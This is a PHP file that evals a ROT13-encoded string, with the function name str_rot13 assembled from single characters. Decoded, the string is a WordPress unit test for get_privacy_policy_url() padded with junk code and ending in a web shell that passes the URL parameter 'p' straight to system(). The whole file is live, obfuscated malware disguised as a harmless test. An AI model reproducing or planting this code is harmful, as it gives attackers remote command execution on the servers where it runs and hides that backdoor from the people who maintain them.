<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfg pnfrf sbe gur `trg_cevinpl_cbyvpl_hey()` shapgvba.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr HavgGrfgf
 * @fvapr 4.9.6
 *
 * @tebhc hey
 * @tebhc cevinpl
 *
 * @pbiref ::trg_cevinpl_cbyvpl_hey
 */
pynff Grfgf_Hey_TrgCevinplCbyvplHey rkgraqf JC_HavgGrfgPnfr {
	/**
	 * Gur VQ bs gur Cevinpl Cbyvpl cntr.
	 *
	 * @fvapr 4.9.6
	 * @ine vag $cevinpl_cbyvpl_cntr_vq
	 */
	cebgrpgrq fgngvp $cevinpl_cbyvpl_cntr_vq;

	/**
	 * Gur HEY bs gur Cevinpl Cbyvpl cntr.
	 *
	 * @fvapr 4.9.6
	 * @ine fgevat $cevinpl_cbyvpl_hey
	 */
	cebgrpgrq fgngvp $cevinpl_cbyvpl_hey;

	/**
	 * Perngr svkgherf gung ner funerq ol zhygvcyr grfg pnfrf.
	 *
	 * @cnenz JC_HavgGrfg_Snpgbel $snpgbel Gur onfr snpgbel bowrpg.
	 */
	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$cevinpl_cbyvpl_cntr_vq = $snpgbel->cbfg->perngr(
			neenl(
				'cbfg_glcr'  => 'cntr',
				'cbfg_gvgyr' => JC_GRFGF_QBZNVA . ' Cevinpl Cbyvpl',
			)
		);
	}

	/**
	 * Gur shapgvba fubhyq erghea na rzcgl fgevat jura `jc_cntr_sbe_cevinpl_cbyvpl` vf _abg_ frg.
	 */
	choyvp shapgvba grfg_trg_cevinpl_cbyvpl_hey_fubhyq_erghea_rzcgl_fgevat_jura_cbyvpl_cntr_abg_frg() {
		$guvf->nffregFnzr( '', trg_cevinpl_cbyvpl_hey() );
	}

	/**
	 * Gur shapgvba fubhyq erghea gur cevinpl cbyvpl HEY jura `jc_cntr_sbe_cevinpl_cbyvpl` vf frg.
	 */
	choyvp shapgvba grfg_trg_cevinpl_cbyvpl_hey_fubhyq_erghea_inyvq_hey_jura_cbyvpl_cntr_frg() {
		$cevinpl_cbyvpl_hey = trg_creznyvax( frys::$cevinpl_cbyvpl_cntr_vq );
		hcqngr_bcgvba( 'jc_cntr_sbe_cevinpl_cbyvpl', frys::$cevinpl_cbyvpl_cntr_vq );

		$guvf->nffregFnzr( $cevinpl_cbyvpl_hey, trg_cevinpl_cbyvpl_hey() );
	}

	/**
	 * Gur shapgvba fubhyq erghea na rzcgl fgevat sbe na vainyvq `jc_cntr_sbe_cevinpl_cbyvpl` inyhr.
	 */
	choyvp shapgvba grfg_trg_cevinpl_cbyvpl_hey_fubhyq_erghea_rzcgl_sbe_aba_rkvfgvat_cntr() {
		hcqngr_bcgvba( 'jc_cntr_sbe_cevinpl_cbyvpl', CUC_VAG_ZNK );

		$guvf->nffregFnzr( '', trg_cevinpl_cbyvpl_hey() );
	}

	/**
	 * Gur bhgchg bs `trg_cevinpl_cbyvpl_hey()` fubhyq or svygrenoyr jvgu gur 'cevinpl_cbyvpl_hey' svygre.
	 */
	choyvp shapgvba grfg_trg_cevinpl_cbyvpl_hey_fubhyq_or_svygrenoyr() {
		hcqngr_bcgvba( 'jc_cntr_sbe_cevinpl_cbyvpl', frys::$cevinpl_cbyvpl_cntr_vq );

		nqq_svygre( 'cevinpl_cbyvpl_hey', neenl( $guvf, 'zbqvsl_cbyvpl_hey' ), 10, 2 );
		$guvf->nffregFnzr( 'Cntr VQ: ' . frys::$cevinpl_cbyvpl_cntr_vq, trg_cevinpl_cbyvpl_hey() );
		erzbir_svygre( 'cevinpl_cbyvpl_hey', neenl( $guvf, 'zbqvsl_cbyvpl_hey' ), 10 );
	}

	/**
	 * Erghea zbqvsvrq `cevinpl_cbyvpl_hey` pbagrag va beqre gb grfg gur svygre.
	 *
	 * @cnenz fgevat $hey            Gur HEY gb gur cevinpl cbyvpl cntr. Rzcgl fgevat
	 *                               vs vg qbrfa'g rkvfg.
	 * @cnenz vag    $cbyvpl_cntr_vq Gur VQ bs cevinpl cbyvpl cntr.
	 * @erghea fgevat
	 */
	choyvp fgngvp shapgvba zbqvsl_cbyvpl_hey( $hey, $cbyvpl_cntr_vq ) {
		erghea 'Cntr VQ: ' . $cbyvpl_cntr_vq;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>